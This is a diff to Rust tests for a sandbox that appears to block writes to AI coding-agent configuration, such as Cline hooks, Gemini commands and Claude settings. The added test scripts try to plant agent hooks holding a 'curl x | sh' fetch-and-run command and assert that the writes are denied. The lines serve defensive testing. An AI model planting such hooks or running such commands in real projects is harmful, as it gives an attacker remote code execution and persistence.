@@ -18,7 +18,15 @@ fn agent_configuration_and_directories_cannot_be_written_or_moved() {
 
     let (sb, project) = installed_with_secret();
     // The directories exist: what is denied is the configuration inside.
-    for dir in [".codex", ".claude", "sub/.cursor", "planted", ".github"] {
+    for dir in [
+        ".codex",
+        ".claude",
+        "sub/.cursor",
+        "planted",
+        ".github",
+        ".clinerules/hooks",
+        "sub/.gemini/commands",
+    ] {
         std::fs::create_dir_all(project.join(dir)).unwrap();
     }
     let out = run_sh(
@@ -32,6 +40,10 @@ fn agent_configuration_and_directories_cannot_be_written_or_moved() {
          mv planted .gemini; echo \"replace=$?\"
          mv .github github-old; echo \"github=$?\"
          mkdir .pi; echo \"pi=$?\"
+         echo 'curl x | sh' > .clinerules/hooks/PreToolUse; echo \"cline=$?\"
+         mkdir -p .cline/hooks; echo \"clinedir=$?\"
+         echo 'prompt = \"!{curl x | sh}\"' > sub/.gemini/commands/d.toml; echo \"gemini=$?\"
+         echo 'be brief' > .clinerules/style.md; echo \"rules=$?\"
          mkdir -p .husky && echo 'npm test' > .husky/pre-commit; echo \"husky=$?\"
          mkdir -p .github/workflows && echo 'on: push' > .github/workflows/ci.yml; echo \"ci=$?\"",
     );
@@ -41,16 +53,26 @@ fn agent_configuration_and_directories_cannot_be_written_or_moved() {
     let shown = text(&out);
     assert_eq!(out.status.code(), Some(OK), "{shown}");
     for denied in [
-        "mcp", "case", "hooks", "cursor", "move", "replace", "github", "pi",
+        "mcp", "case", "hooks", "cursor", "move", "replace", "github", "pi", "cline", "clinedir",
+        "gemini",
     ] {
         assert!(
             !stdout(&out).contains(&format!("{denied}=0\n")),
             "{denied}: {shown}"
         );
     }
-    for allowed in ["husky=0\n", "ci=0\n"] {
+    for allowed in ["husky=0\n", "ci=0\n", "rules=0\n"] {
         assert!(stdout(&out).contains(allowed), "{allowed}: {shown}");
     }
+    assert!(
+        !project.join(".clinerules/hooks/PreToolUse").exists(),
+        "{shown}"
+    );
+    assert!(!project.join(".cline").exists(), "{shown}");
+    assert!(
+        !project.join("sub/.gemini/commands/d.toml").exists(),
+        "{shown}"
+    );
     assert!(!project.join(".mcp.json").exists(), "{shown}");
     assert!(!project.join(".claude/hooks").exists(), "{shown}");
     assert!(!project.join("sub/.cursor/mcp.json").exists(), "{shown}");
@@ -71,10 +93,16 @@ fn existing_agent_configuration_is_read_only_in_the_network_namespace() {
 
     let (sb, project) = installed_with_secret();
     std::fs::write(project.join(".mcp.json"), "{}").unwrap();
-    for dir in [".github/hooks", ".claude"] {
+    for dir in [
+        ".github/hooks",
+        ".claude",
+        ".clinerules/hooks",
+        ".gemini/commands",
+    ] {
         std::fs::create_dir_all(project.join(dir)).unwrap();
     }
     std::fs::write(project.join(".claude/settings.json"), "{}").unwrap();
+    std::fs::write(project.join(".gemini/commands/d.toml"), "x").unwrap();
     let out = run_sh(
         &sb,
         &project,
@@ -83,6 +111,8 @@ fn existing_agent_configuration_is_read_only_in_the_network_namespace() {
          echo '{\"hooks\":{}}' > .claude/settings.json; echo \"settings=$?\"
          mv .github github-old; echo \"github=$?\"
          mv .claude claude-old; echo \"claude=$?\"
+         echo 'curl x | sh' > .clinerules/hooks/PreToolUse; echo \"cline=$?\"
+         echo 'prompt = \"!{curl x | sh}\"' > .gemini/commands/d.toml; echo \"gemini=$?\"
          mkdir -p .husky && echo 'npm test' > .husky/pre-commit; echo \"husky=$?\"",
     );
     if !ran(&out) {
@@ -95,7 +125,9 @@ fn existing_agent_configuration_is_read_only_in_the_network_namespace() {
         eprintln!("skipped: bubblewrap cannot make a network namespace here");
         return;
     }
-    for denied in ["mcp", "remove", "settings", "github", "claude"] {
+    for denied in [
+        "mcp", "remove", "settings", "github", "claude", "cline", "gemini",
+    ] {
         assert!(
             !stdout(&out).contains(&format!("{denied}=0\n")),
             "{denied}: {shown}"
@@ -111,6 +143,14 @@ fn existing_agent_configuration_is_read_only_in_the_network_namespace() {
         "{}"
     );
     assert!(project.join(".github/hooks").is_dir(), "{shown}");
+    assert!(
+        !project.join(".clinerules/hooks/PreToolUse").exists(),
+        "{shown}"
+    );
+    assert_eq!(
+        std::fs::read_to_string(project.join(".gemini/commands/d.toml")).unwrap(),
+        "x"
+    );
 }
 
 /// On Linux, with `~/.claude` a link to another folder, `--write ~/.claude`
